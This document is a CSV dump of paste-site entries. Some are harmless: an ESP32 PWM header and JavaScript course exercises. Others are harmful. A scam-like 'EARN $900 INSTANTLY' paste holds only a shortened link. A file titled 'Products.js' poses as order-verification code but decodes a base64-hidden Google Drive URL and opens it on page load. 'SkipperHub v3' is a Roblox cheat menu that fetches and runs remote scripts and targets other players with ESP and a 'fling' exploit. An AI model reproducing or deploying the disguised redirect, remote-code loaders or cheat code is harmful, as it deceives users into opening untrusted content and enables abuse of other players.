id,title,username,language,date,content
pE78JyA8,pwm,ces-engine,C++,Monday 7th of April 2025 07:04:14 AM CDT,"#ifndef PWM_CONTROLLER_H
#define PWM_CONTROLLER_H

#include ""settings.h""

class PWMController {
public:
    PWMController() {
        for (int i = 0; i < 4; i++) {  // Все 4 канала
            ledcSetup(pwmChannels[i], frequencies[i], getResolution(frequencies[i]));
            ledcAttachPin(pwmPins[i], pwmChannels[i]);
            ledcWrite(pwmChannels[i], 0);
        }
    }

    void setFrequency(int channel, int freq) {
        if (channel >= 0 && channel < 4 && freq >= 1 && freq <= 20000) {
            frequencies[channel] = freq;
            ledcSetup(pwmChannels[channel], freq, getResolution(freq));
        }
    }

    void setDuty(int channel, int duty) {
        if (channel >= 0 && channel < 4 && duty >= 0 && duty <= 100) {
            duties[channel] = duty;
            int pwmValue = map(duty, 0, 100, 0, (1 << getResolution(frequencies[channel])) - 1);
            ledcWrite(pwmChannels[channel], pwmValue);
        }
    }


private:
    int getResolution(int freq) {
        if (freq < 10) return 16;
        if (freq < 100) return 14;
        if (freq < 1000) return 12;
        return 10;
    }
};

#endif

///
///settings.h
///
#ifndef SETTINGS_H
#define SETTINGS_H

// Пины для ШИМ
const int pwmPins[] = {1, 2, 3, 10}; // GPIO
const int pwmChannels[] = {0, 1, 2, 3}; // Каналы LEDC

extern int frequencies[] = {1, 100, 1000, 1000}; 
extern int duties[] = {5, 25, 50, 100};
"
kATaM6ww,02.EcoEvent,Kamend1,JavaScript,Monday 7th of April 2025 07:02:02 AM CDT,"window.addEventListener(""load"", solve);

function solve() {
	let nextBtn = document.getElementById('next-btn');
	let previewList = document.getElementById('preview-list');
	let eventList = document.getElementById('event-list');
	let emailField = document.getElementById('email');
	let eventField = document.getElementById('event');
	let locationField = document.getElementById('location');
	
	nextBtn.addEventListener('click', function (e) {
		e.preventDefault();
		addEventToPreview();
	})
	
	function addEventToPreview () {

		if (!emailField.value || !eventField.value || !locationField.value) {
			return;
		}

		let eventItem = document.createElement('li');
		eventItem.classList.add('application');
		let eventArticle = document.createElement('article');

		let eventEmail = document.createElement('h4');
		eventEmail.textContent = emailField.value;
		eventArticle.appendChild(eventEmail);

		let eventPara = document.createElement('p');
		let paraTitle = document.createElement('strong');
		paraTitle.textContent = 'Event:';
		let eventBreak = document.createElement('br');
		eventPara.appendChild(paraTitle);
		eventPara.appendChild(eventBreak);
		eventPara.append(eventField.value);
		eventArticle.appendChild(eventPara);

		let locationPara = document.createElement('p');
		let paraTitleLoc = document.createElement('strong');
		paraTitleLoc.textContent = 'Location:';
		let eventBreakLoc = document.createElement('br');
		locationPara.appendChild(paraTitleLoc);
		locationPara.appendChild(eventBreakLoc);
		locationPara.append(locationField.value);
		eventArticle.appendChild(locationPara);

		eventItem.appendChild(eventArticle);

		let editBtn = document.createElement('button');
		editBtn.classList.add('action-btn');
		editBtn.classList.add('edit');
		editBtn.textContent = 'edit';
		editBtn.addEventListener('click', editEvent);
		eventItem.appendChild(editBtn);

		let applyBtn = document.createElement('button');
		applyBtn.classList.add('action-btn');
		applyBtn.classList.add('apply');
		applyBtn.textContent = 'apply';
		applyBtn.addEventListener('click', applyEvent);
		eventItem.appendChild(applyBtn);

		previewList.appendChild(eventItem);

		nextBtn.disabled = true;
		emailField.value = '';
		eventField.value = '';
		locationField.value = '';
	}

	function editEvent (event) {
		let editEventLi = event.currentTarget.parentElement;
		let editEmail = editEventLi.querySelector('article h4').textContent;
		let editEvent = editEventLi.querySelector('article p:first-of-type').textContent.split(':')[1];
		let editLocation = editEventLi.querySelector('article p:last-of-type').textContent.split(':')[1];

		emailField.value = editEmail;
		eventField.value = editEvent;
		locationField.value = editLocation;
		nextBtn.disabled = false;
		
		previewList.removeChild(editEventLi);
	}

	function applyEvent (event) {
		let applyEventLi = event.currentTarget.parentElement;
		let buttons = applyEventLi.querySelectorAll('button');

		for (let btn of buttons) {
			applyEventLi.removeChild(btn);
		}

		previewList.removeChild(applyEventLi);
		eventList.appendChild(applyEventLi);
	}
}"
v1w39TKW,01.Farm Management System,Kamend1,JavaScript,Monday 7th of April 2025 07:00:25 AM CDT,"function solve (commandArr) {
    class Farmer {
        constructor (name, location) {
            this.name = name;
            this.location = location;
            this.skills = []
        }
    }

    let farmerArr = [];
    let numFarmers = Number(commandArr[0]);

    for (let idx = 1; idx <= numFarmers; idx++) {
        let farmerStr = commandArr[idx];
        let [name, location, skills] = farmerStr.split(' ');
        let farmer = new Farmer(name, location);
        let skillArr = skills.split(',');

        for (let skill of skillArr) {
            farmer.skills.push(skill);
        }
        farmerArr.push(farmer);
    }

    for (let idx = numFarmers + 1; idx < commandArr.length; idx++) {
        currentCommandTokens = commandArr[idx].split(' / ');
        if (currentCommandTokens[0] === ""End"") {
            break;
        } else if (currentCommandTokens[0] === ""Execute"") {
            let [_, name, location, task] = currentCommandTokens;
            let currentFarmer = farmerArr.find(p => p.name === name);

            if (!currentFarmer) {
                continue;
            }

            if (currentFarmer.location !== location) {
                console.log(`${currentFarmer.name} cannot execute the task: ${task}.`);
                continue;
            }

            if (!currentFarmer.skills.includes(task)) {
                console.log(`${currentFarmer.name} cannot execute the task: ${task}.`);
                continue;
            }

            console.log(`${currentFarmer.name} has executed the task: ${task}!`)

        } else if (currentCommandTokens[0] === ""Change Area"") {
            let [_, name, location] = currentCommandTokens;
            let currentFarmer = farmerArr.find(p => p.name === name);
            
            if (!currentFarmer) {
                continue;
            }

            if (currentFarmer.location !== location) {
                currentFarmer.location = location;
                console.log(`${currentFarmer.name} has changed their work area to: ${location}`);
            }

        } else if (currentCommandTokens[0] === ""Learn Task"") {
            let [_, name, task] = currentCommandTokens;
            let currentFarmer = farmerArr.find(p => p.name === name);
            
            if (!currentFarmer) {
                continue;
            }

            if (currentFarmer.skills.includes(task)) {
                console.log(`${currentFarmer.name} already knows how to perform ${task}.`);
            } else {
                currentFarmer.skills.push(task);
                console.log(`${currentFarmer.name} has learned a new task: ${task}.`);
            }
        }
    }

    for (let farmer of farmerArr) {
        console.log(`Farmer: ${farmer.name}, Area: ${farmer.location}, Tasks: ${farmer.skills.sort().join(', ')}`);
    }

}"
emxbRxaD,EARN $900 INSTANTLY 2025 X0,ArchangelX1,JavaScript,Monday 7th of April 2025 06:59:03 AM CDT," 
Pdf https://goo.su/DgLIPOe


lbQ6Eoc3rD
"
e9vcK3L0,Products.js,Epiphemeral,JavaScript,Monday 7th of April 2025 06:58:39 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/01811/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Ja7iUABb,SkipperHub v3,jenitho,Lua,Monday 7th of April 2025 06:48:36 AM CDT,"--SkipperHub!!!

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = ""💫Skippers Mod Menu💫 | Free"",
   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
   LoadingTitle = ""Free v3"",
   LoadingSubtitle = ""by Skipper"",
   Theme = ""Default"", -- Check https://docs.sirius.menu/rayfield/configuration/themes

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = ""Big Hub""
   },

   Discord = {
      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
      Invite = ""noinvitelink"", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },

   KeySystem = true, -- Set this to true to use our key system
   KeySettings = {
      Title = ""Skipper Mod Menu | Free"",
      Subtitle = ""Key System"",
      Note = ""Key System even tho it´s Free | In Discord!"", -- Use this to tell the user how to get a key
      FileName = ""Key"", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = false, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = true, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {""GUI""} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings (""hello"",""key22"")
   }
})


Rayfield:Notify({
   Title = ""Thanks for using our Script!"",
   Content = ""have fun!"",
   Duration = 10,
   Image = 4483362458,
})

local ESPTab = Window:CreateTab(""🟥Esp Opptions🟥"", 4483362458) -- Title, Image
local ESPSection = ESPTab:CreateSection(""🟥ESP🟥"")


local AIMTab = Window:CreateTab(""🔫Aim Oppitions🔫"", 4483362458) -- Title, Image
local AIMSection = AIMTab:CreateSection(""🔫Aimbot"")


local STUFFTab = Window:CreateTab(""➕Other Stuff➕"", 4483362458) -- Title, Image
local STUFFSection = STUFFTab:CreateSection(""➕Stuff➕"")


local ScrTab = Window:CreateTab(""☁️Scripthubs Opptions☁️"", 4483362458) -- Title, Image
local ScrSection = ScrTab:CreateSection(""☁️Hubs☁️"")


local DISTab = Window:CreateTab(""✨Discord✨"", 4483362458) -- Title, Image
local DISSection = DISTab:CreateSection(""✨https://discord.gg/mDnAFVs8✨"")


    
local Button = ESPTab:CreateButton({
   Name = ""🔴Tracer (Everyone)🔴"",
   Callback = function()
   -- LocalScript in StarterPlayer > StarterPlayerScripts

local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local localPlayer = Players.LocalPlayer

-- Tracer-Einstellungen
local function createTracer()
	local tracer = Drawing.new(""Line"")
	tracer.Color = Color3.fromRGB(225,27,27)
	tracer.Thickness = 1.5
	tracer.Transparency = 1
	tracer.Visible = true
	return tracer
end

-- Spieler ESP hinzufügen (Highlight + Tracer)
local trackedPlayers = {}

local function addESP(targetPlayer)
	if targetPlayer == localPlayer then return end

	local function onCharacterAdded(character)
		-- Highlight hinzufügen
		local highlight = Instance.new(""Highlight"")
		highlight.FillColor = Color3.fromRGB(0, 255, 0)
		highlight.FillTransparency = 0.5
		highlight.OutlineTransparency = 1
		highlight.Adornee = character
		highlight.Parent = character

		-- Tracer erstellen
		local tracer = createTracer()
		trackedPlayers[targetPlayer] = {
			character = character,
			tracer = tracer
		}
	end

	if targetPlayer.Character then
		onCharacterAdded(targetPlayer.Character)
	end

	targetPlayer.CharacterAdded:Connect(onCharacterAdded)
end

-- Alle bestehenden Spieler tracken
for _, player in pairs(Players:GetPlayers()) do
	addESP(player)
end

-- Neue Spieler tracken
Players.PlayerAdded:Connect(function(player)
	addESP(player)
end)

-- Update Tracers jedes Frame
RunService.RenderStepped:Connect(function()
	for player, data in pairs(trackedPlayers) do
		local character = data.character
		local tracer = data.tracer

		if character and character:FindFirstChild(""HumanoidRootPart"") then
			local hrp = character.HumanoidRootPart
			local screenPos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(hrp.Position)
			if onScreen then
				local bottomOfScreen = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y)
				tracer.From = bottomOfScreen
				tracer.To = Vector2.new(screenPos.X, screenPos.Y)
				tracer.Visible = true
			else
				tracer.Visible = false
			end
		else
			tracer.Visible = false
		end
	end
end)
   end,
})


local Button = ScrTab:CreateButton({
   Name = ""☁️Infinity Yield☁️"",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
   end,
})


local Button = ScrTab:CreateButton({
   Name = ""☁️Solara Hub v3☁️"",
   Callback = function()
   loadstring(game:HttpGet(""https://raw.githubusercontent.com/samuraa1/Solara-Hub/refs/heads/main/Solara%20Hub.lua""))()
   end,
})


local Button = ScrTab:CreateButton({
   Name = ""☁️Chat Troller☁️ (Patched)"",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/ffedex/characters/refs/heads/main/chars', true))()
   end,
})


local Button = STUFFTab:CreateButton({
   Name = ""✖️Walkspeed✖️"",
   Callback = function()
    local Player = game.Players.LocalPlayer
local UIS = game:GetService(""UserInputService"")
local TweenService = game:GetService(""TweenService"")
local CharacterAdded = Player.CharacterAdded
 
local function createUI()
    local Character = Player.Character or Player.CharacterAdded:Wait()
    local Humanoid = Character:WaitForChild(""Humanoid"")
    
    -- Create the GUI elements
    local ScreenGui = Instance.new(""ScreenGui"")
    ScreenGui.Parent = Player:WaitForChild(""PlayerGui"")
    ScreenGui.Name = ""WalkSpeedGUI""
 
    -- Create the frame for the slider
    local Frame = Instance.new(""Frame"")
    Frame.Size = UDim2.new(0, 420, 0, 120)
    Frame.Position = UDim2.new(0.5, -210, 0.8, -60)
    Frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    Frame.BackgroundTransparency = 0.5
    Frame.BorderSizePixel = 0
    Frame.Parent = ScreenGui
    -- Add rounded corners to the frame
    local UICorner = Instance.new(""UICorner"")
    UICorner.CornerRadius = UDim.new(0, 16)
    UICorner.Parent = Frame
 
    -- Create the title text
    local Title = Instance.new(""TextLabel"")
    Title.Size = UDim2.new(1, 0, 0, 30)
    Title.Text = ""WalkSpeed Slider""
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 22
    Title.Font = Enum.Font.GothamBold
    Title.TextStrokeTransparency = 0.8
    Title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    Title.BackgroundTransparency = 1
    Title.Parent = Frame
 
    -- Create the slider container
    local Slider = Instance.new(""Frame"")
    Slider.Size = UDim2.new(1, -40, 0, 10)
    Slider.Position = UDim2.new(0, 20, 0, 50)
    Slider.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    Slider.BorderSizePixel = 0
    Slider.Parent = Frame
    -- Add rounded corners to the slider container
    local SliderCorner = Instance.new(""UICorner"")
    SliderCorner.CornerRadius = UDim.new(0, 5)
    SliderCorner.Parent = Slider
 
    -- Create the slider button
    local SliderButton = Instance.new(""Frame"")
    SliderButton.Size = UDim2.new(0, 20, 1, 0)
    SliderButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    SliderButton.BorderSizePixel = 0
    SliderButton.Parent = Slider
    -- Add rounded corners to the slider button
    local SliderButtonCorner = Instance.new(""UICorner"")
    SliderButtonCorner.CornerRadius = UDim.new(0, 10)
    SliderButtonCorner.Parent = SliderButton
 
    -- Create gradient effect for the slider button
    local Gradient = Instance.new(""UIGradient"")
    Gradient.Rotation = 45
    Gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 0)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 200, 0))
    })
    Gradient.Parent = SliderButton
 
    -- Function to update walkspeed based on slider position
    local function updateWalkSpeed()
        -- Get the X position of the slider button
        local sliderPosition = SliderButton.Position.X.Offset / Slider.AbsoluteSize.X
        -- Debugging: Print the slider position and walk speed
        print(""Slider Position:"", sliderPosition)
        -- Ensure the walk speed is within a reasonable range, clamp it between 16 and 500
        Humanoid.WalkSpeed = math.clamp(sliderPosition * 500, 16, 500)
        print(""Updated WalkSpeed:"", Humanoid.WalkSpeed)
    end
 
    -- Dragging logic
    local dragging = false
    local mouse = Player:GetMouse()
 
    SliderButton.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
        end
    end)
 
    SliderButton.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
 
    UIS.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            -- Calculate the new position of the slider button based on the mouse's X position
            local sliderWidth = Slider.AbsoluteSize.X
            local newX = math.clamp(mouse.X - Slider.AbsolutePosition.X, 0, sliderWidth)
            -- Set the slider button position with a smooth tween effect
            TweenService:Create(SliderButton, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0, newX, 0, 0)}):Play()
            -- Update WalkSpeed continuously as the button is moved
            updateWalkSpeed()
        end
    end)
 
    -- Initial walk speed setup
    updateWalkSpeed()
end
 
-- Recreate UI every time the player respawns
CharacterAdded:Connect(function()
    -- Clean up any existing UI if it exists
    if Player:FindFirstChild(""PlayerGui"") and Player.PlayerGui:FindFirstChild(""WalkSpeedGUI"") then
        Player.PlayerGui:FindFirstChild(""WalkSpeedGUI""):Destroy()
    end
    -- Create a new UI after respawn
    createUI()
end)
 
-- Create the UI for the first time
createUI()
   
   end,
})

local Button = STUFFTab:CreateButton({
   Name = ""✖️Jump Power✖️"",
   Callback = function()
   local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild(""Humanoid"")
 
-- Ensure humanoid updates on respawn
player.CharacterAdded:Connect(function(newCharacter)
    character = newCharacter
    humanoid = newCharacter:WaitForChild(""Humanoid"")
end)
 
-- Create UI
local screenGui = Instance.new(""ScreenGui"")
screenGui.Parent = player:WaitForChild(""PlayerGui"")
 
local frame = Instance.new(""Frame"")
frame.Size = UDim2.new(0, 200, 0, 50)
frame.Position = UDim2.new(0.5, -100, 0.1, 0)
frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Dark grey
frame.BorderSizePixel = 0
frame.Active = true -- Needed for dragging
frame.Draggable = true -- Makes the frame draggable
frame.Parent = screenGui
 
-- Rounded Edges
local uiCorner = Instance.new(""UICorner"")
uiCorner.CornerRadius = UDim.new(0.2, 0)
uiCorner.Parent = frame
 
local label = Instance.new(""TextLabel"")
label.Text = ""Jump Power:""
label.Size = UDim2.new(0, 100, 1, 0)
label.Position = UDim2.new(0, 5, 0, 0)
label.BackgroundTransparency = 1
label.TextColor3 = Color3.new(1, 1, 1) -- White
label.TextScaled = true
label.Font = Enum.Font.SourceSans
label.Parent = frame
 
local textBox = Instance.new(""TextBox"")
textBox.Size = UDim2.new(0, 80, 0.8, 0)
textBox.Position = UDim2.new(1, -85, 0.1, 0)
textBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Slightly darker grey
textBox.TextColor3 = Color3.new(1, 1, 1)
textBox.Text = """" -- Starts empty
textBox.TextScaled = true
textBox.Font = Enum.Font.SourceSans
textBox.Parent = frame
 
local uiCorner2 = Instance.new(""UICorner"")
uiCorner2.CornerRadius = UDim.new(0.2, 0)
uiCorner2.Parent = textBox
 
-- Default Jump Power
local defaultJumpPower = humanoid.JumpPower
 
-- Update Jump Power
textBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        local newJumpPower = tonumber(textBox.Text)
        if newJumpPower and newJumpPower > 0 then
            humanoid.JumpPower = newJumpPower
        else
            textBox.Text = """"
            humanoid.JumpPower = defaultJumpPower -- Reset to default
        end
    end
end)
   end,
})


local Button = STUFFTab:CreateButton({
   Name = ""➕Fling➕"",
   Callback = function()
   local Players = game:GetService(""Players"")
local Player = Players.LocalPlayer
 
local ScreenGui = Instance.new(""ScreenGui"")
local Frame = Instance.new(""Frame"")
local TextBox = Instance.new(""TextBox"")
local TextButton = Instance.new(""TextButton"")
local CloseButton = Instance.new(""TextButton"") -- Close button
 
ScreenGui.Parent = Player:WaitForChild(""PlayerGui"")
ScreenGui.ResetOnSpawn = false
 
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
Frame.Position = UDim2.new(0.5, -100, 0.5, -50)
Frame.Size = UDim2.new(0, 200, 0, 100)
Frame.Active = true
Frame.Draggable = true
 
TextBox.Parent = Frame
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.Position = UDim2.new(0.1, 0, 0.2, 0)
TextBox.Size = UDim2.new(0.8, 0, 0.2, 0)
TextBox.Font = Enum.Font.SourceSans
TextBox.PlaceholderText = ""Enter username""
TextBox.Text = """"
TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
TextBox.TextSize = 14
 
TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextButton.Position = UDim2.new(0.1, 0, 0.5, 0)
TextButton.Size = UDim2.new(0.8, 0, 0.4, 0)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = ""FLING!""
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 20
 
-- Close button properties
CloseButton.Parent = Frame
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CloseButton.Position = UDim2.new(0.9, 0, 0, 0)
CloseButton.Size = UDim2.new(0, 20, 0, 20)
CloseButton.Font = Enum.Font.SourceSans
CloseButton.Text = ""X""
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextSize = 14
 
local function GetPlayer(Name)
    Name = Name:lower()
    for _, x in next, Players:GetPlayers() do
        if x ~= Player then
            if x.Name:lower():match(""^"" .. Name) or x.DisplayName:lower():match(""^"" .. Name) then
                return x
            end
        end
    end
    return nil
end
 
local function Message(_Title, _Text, Time)
    game:GetService(""StarterGui""):SetCore(""SendNotification"", {Title = _Title, Text = _Text, Duration = Time})
end
 
local function SkidFling(TargetPlayer)
    local Character = Player.Character
    local Humanoid = Character and Character:FindFirstChildOfClass(""Humanoid"")
    local RootPart = Humanoid and Humanoid.RootPart
 
    local TCharacter = TargetPlayer.Character
    local THumanoid = TCharacter and TCharacter:FindFirstChildOfClass(""Humanoid"")
    local TRootPart = THumanoid and THumanoid.RootPart
    local THead = TCharacter and TCharacter:FindFirstChild(""Head"")
    local Accessory = TCharacter and TCharacter:FindFirstChildOfClass(""Accessory"")
    local Handle = Accessory and Accessory:FindFirstChild(""Handle"")
 
    if Character and Humanoid and RootPart then
        if RootPart.Velocity.Magnitude < 50 then
            getgenv().OldPos = RootPart.CFrame
        end
        if THumanoid and THumanoid.Sit then
            return Message(""Error Occurred"", ""Target is sitting"", 5)
        end
        if THead then
            workspace.CurrentCamera.CameraSubject = THead
        elseif Handle then
            workspace.CurrentCamera.CameraSubject = Handle
        else
            workspace.CurrentCamera.CameraSubject = THumanoid
        end
        if not TCharacter:FindFirstChildWhichIsA(""BasePart"") then
            return
        end
 
        local function FPos(BasePart, Pos, Ang)
            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
        end
 
        local function SFBasePart(BasePart)
            local TimeToWait = 2
            local Time = tick()
            local Angle = 0
 
            repeat
                if RootPart and THumanoid then
                    if BasePart.Velocity.Magnitude < 50 then
                        Angle = Angle + 100
 
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                    else
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
                    end
                else
                    break
                end
            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
        end
 
        workspace.FallenPartsDestroyHeight = 0/0
 
        local BV = Instance.new(""BodyVelocity"")
        BV.Name = ""EpixVel""
        BV.Parent = RootPart
        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
 
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
 
        if TRootPart and THead then
            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                SFBasePart(THead)
            else
                SFBasePart(TRootPart)
            end
        elseif TRootPart and not THead then
            SFBasePart(TRootPart)
        elseif not TRootPart and THead then
            SFBasePart(THead)
        elseif not TRootPart and not THead and Accessory and Handle then
            SFBasePart(Handle)
        end
 
        BV:Destroy()
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        workspace.CurrentCamera.CameraSubject = Humanoid
 
        repeat
            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
            Humanoid:ChangeState(""GettingUp"")
            table.foreach(Character:GetChildren(), function(_, x)
                if x:IsA(""BasePart"") then
                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
                end
            end)
            task.wait()
        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
        workspace.FallenPartsDestroyHeight = getgenv().FPDH
    else
        return Message(""Error Occurred"", ""Random error"", 5)
    end
end
 
TextButton.MouseButton1Click:Connect(function()
    local targetName = TextBox.Text
    local targetPlayer = GetPlayer(targetName)
 
    if targetPlayer then
        SkidFling(targetPlayer)
    else
        Message(""Error Occurred"", ""Invalid username"", 5)
    end
end)
 
-- Close button functionality
CloseButton.MouseButton1Click:Connect(function()
    ScreenGui.Enabled = false
end)
   end,
})

local Toggle = STUFFTab:CreateButton({
    Name = ""✖️Bunny Sprint✖️"",
    Callback = function(Value)
        -- Movement settings
local STRAFE_SPEED = 30
local AIR_MULTIPLIER = 1.5
local BHOP_POWER = 40

-- Services
local Players = game:GetService(""Players"")
local UserInputService = game:GetService(""UserInputService"")
local RunService = game:GetService(""RunService"")

-- Local player setup
local player = Players.LocalPlayer
local mouse = player:GetMouse()

-- Variables
local moveKeys = {
    W = false,
    A = false,
    S = false,
    D = false,
    Space = false
}

-- Functions to handle character access safely
local function getChar()
    return player.Character or player.CharacterAdded:Wait()
end

local function getRoot()
    local char = getChar()
    return char:FindFirstChild(""HumanoidRootPart"")
end

local function getHumanoid()
    local char = getChar()
    return char:FindFirstChild(""Humanoid"")
end

-- Movement function
local function calculateMoveDirection()
    local dir = Vector3.new(0, 0, 0)
    local char = getChar()
    if not char then return dir end
    
    local cf = workspace.CurrentCamera.CFrame
    
    if moveKeys.W then
        dir = dir + cf.LookVector
    end
    if moveKeys.S then
        dir = dir - cf.LookVector
    end
    if moveKeys.A then
        dir = dir - cf.RightVector
    end
    if moveKeys.D then
        dir = dir + cf.RightVector
    end
    
    dir = Vector3.new(dir.X, 0, dir.Z).Unit
    return dir
end

-- Key handling
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    if input.KeyCode == Enum.KeyCode.W then
        moveKeys.W = true
    elseif input.KeyCode == Enum.KeyCode.A then
        moveKeys.A = true
    elseif input.KeyCode == Enum.KeyCode.S then
        moveKeys.S = true
    elseif input.KeyCode == Enum.KeyCode.D then
        moveKeys.D = true
    elseif input.KeyCode == Enum.KeyCode.Space then
        moveKeys.Space = true
    end
end)

